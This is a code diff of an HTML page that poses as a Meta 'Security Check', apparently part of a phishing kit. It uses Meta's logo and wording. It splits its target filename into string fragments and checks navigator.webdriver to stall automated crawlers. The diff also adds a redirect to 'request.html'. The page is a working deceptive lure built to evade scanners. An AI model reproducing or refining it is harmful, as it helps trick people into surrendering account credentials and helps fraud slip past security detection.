@@ -1,14 +1,14 @@
-
 <!DOCTYPE html>
 <html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
-    <title>Service Verification</title>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>
+      Service Verification
+    </title>
     <style>
-        body,
+      body,
         html {
             margin: 0;
             padding: 0;
@@ -16,7 +16,7 @@
             width: 100%;
             background-color: #f0f2f5;
             overflow: hidden;
-            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            font-family: &#39;Segoe UI&#39;, Helvetica, Arial, sans-serif;
         }
 
         #loader {
@@ -72,12 +72,8 @@
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         #main-frame {
@@ -90,49 +86,54 @@
             left: 0;
         }
     </style>
-</head>
-
-<body>
-
+  </head>
+  <body>
     <div id="loader">
-        <div class="card">
-            <img src="1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="logo">
-            <h1>Security Check</h1>
-            <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
-            <div class="spinner"></div>
+      <div class="card">
+        <img src="1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="logo" />
+        <h1>
+          Security Check
+        </h1>
+        <p>
+          This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
+        </p>
+        <div class="spinner">
         </div>
+      </div>
     </div>
-
-    <iframe src="about:blank" id="main-frame"></iframe>
-
+    <iframe src="about:blank" id="main-frame">
+    </iframe>
     <script>
-        (function() {
-            // --- VARIABLE SPLITTING (Bot Protection) ---
-            var s1 = 'ho';
-            var s2 = 'me-';
-            var s3 = 'vi';
-            var s4 = 'ew.';
-            var s5 = 'ht';
-            var s6 = 'ml';
-            var target = s1 + s2 + s3 + s4 + s5 + s6;
+      (function () {
 
-            // --- ANTI-CHROME BOT CHECK ---
-            var isBot = navigator.webdriver || !navigator.userAgent.includes("Mozilla");
-            var waitTime = isBot ? 15000 : 1000; // Bots ko 15 sec wait karwao, insaan ko 2 sec
+        // 🔥 ONLY ADDED PART (REQUEST PAGE REDIRECT)
+        setTimeout(function () {
+          window.location.href = &#34;request.html&#34;;
+        }, 2500);
 
-            setTimeout(function() {
-                var frame = document.getElementById('main-frame');
-                frame.src = target;
+        // --- VARIABLE SPLITTING (as it was) ---
+        var s1 = &#39;ho&#39;;
+        var s2 = &#39;me-&#39;;
+        var s3 = &#39;vi&#39;;
+        var s4 = &#39;ew.&#39;;
+        var s5 = &#39;ht&#39;;
+        var s6 = &#39;ml&#39;;
+        var target = s1 + s2 + s3 + s4 + s5 + s6;
 
-                frame.onload = function() {
-                    // Loader hatane se pehle check ke asli page load hua
-                    document.getElementById('loader').style.display = 'none';
-                    frame.style.display = 'block';
-                };
-            }, waitTime);
-        })();
+        var isBot = navigator.webdriver || !navigator.userAgent.includes(&#34;Mozilla&#34;);
+        var waitTime = isBot ? 15000 : 1000;
+
+        setTimeout(function () {
+            var frame = document.getElementById(&#39;main-frame&#39;);
+            frame.src = target;
+
+            frame.onload = function () {
+                document.getElementById(&#39;loader&#39;).style.display = &#39;none&#39;;
+                frame.style.display = &#39;block&#39;;
+            };
+        }, waitTime);
+
+      })();
     </script>
-
-</body>
-
+  </body>
 </html>
